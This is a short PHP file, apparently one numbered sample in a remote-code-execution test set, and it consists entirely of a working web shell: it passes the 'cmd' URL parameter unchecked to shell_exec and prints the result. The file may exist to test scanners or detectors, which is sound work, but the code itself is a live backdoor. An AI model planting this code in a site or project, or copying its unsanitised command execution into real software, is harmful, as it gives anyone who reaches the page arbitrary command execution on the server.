<?php
// RCE test variation #1360
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>